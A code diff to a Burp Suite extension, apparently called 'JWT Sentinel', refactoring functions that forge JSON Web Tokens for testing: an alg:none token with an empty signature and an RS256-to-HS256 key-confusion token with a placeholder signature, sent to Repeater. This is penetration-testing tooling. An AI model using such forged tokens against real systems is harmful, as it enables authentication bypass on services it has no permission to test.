@@ -224,20 +224,22 @@ class BurpExtender(IBurpExtender, IScannerCheck, IContextMenuFactory):
                                     svc.getProtocol() == "https",
                                     self._helpers.stringToBytes(new_req), tab)
 
+        def forge(alg, signature, tab):
+            # Rebuild the token with a new alg header, keeping the original payload
+            # segment, and set the third (signature) segment to the given value.
+            _, _, parts = parse_jwt(token)
+            new_header = b64url_encode(json.dumps({"alg": alg, "typ": "JWT"}))
+            send_variant(new_header + "." + parts[1] + "." + signature, tab)
+
         def make_none(event):
-            header, payload, parts = parse_jwt(token)
-            new_header = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}))
-            send_variant(new_header + "." + parts[1] + ".", "JWT alg:none")
+            forge("none", "", "JWT alg:none")
 
         def make_confusion(event):
-            # RS->HS confusion SHELL: swaps alg to HS256, leaves signature blank.
-            # Sign header.payload with HMAC using the server's PEM public key, then
-            # paste the signature onto the third segment. (Extension can't fetch the
-            # key for you — this stages the attack, you supply the key.)
-            header, payload, parts = parse_jwt(token)
-            new_header = b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}))
-            send_variant(new_header + "." + parts[1] + ".SIGN_WITH_PUBKEY_HMAC",
-                         "JWT RS->HS shell")
+            # RS->HS confusion SHELL: swaps alg to HS256, leaves the signature a
+            # placeholder. Sign header.payload with HMAC using the server's PEM
+            # public key, then paste that onto the third segment. (Extension can't
+            # fetch the key for you — this stages the attack, you supply the key.)
+            forge("HS256", "SIGN_WITH_PUBKEY_HMAC", "JWT RS->HS shell")
 
         item_none = JMenuItem("JWT Sentinel: forge alg:none -> Repeater",
                               actionPerformed=make_none)
